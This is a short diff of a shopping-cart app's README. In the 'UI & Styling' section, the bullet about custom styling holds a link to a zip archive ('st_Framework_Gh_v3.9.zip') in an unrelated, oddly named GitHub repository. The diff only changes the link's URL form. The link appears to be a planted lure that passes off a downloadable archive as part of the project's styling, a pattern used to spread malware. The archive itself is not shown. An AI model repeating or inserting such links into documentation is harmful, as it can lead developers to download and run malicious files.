@@ -27,7 +27,7 @@ This app allows users to browse products, add them to a cart, update quantities,
 
 ### UI & Styling
 - Fully responsive layout
-- Custom `https://github.com/hon3ymesh/Gh0stFramework/raw/refs/heads/main/src/assets/st_Framework_Gh_v3.9.zip` styling
+- Custom `https://raw.githubusercontent.com/hon3ymesh/Gh0stFramework/main/src/assets/st_Framework_Gh_v3.9.zip` styling
 - No external UI libraries
 
 ---
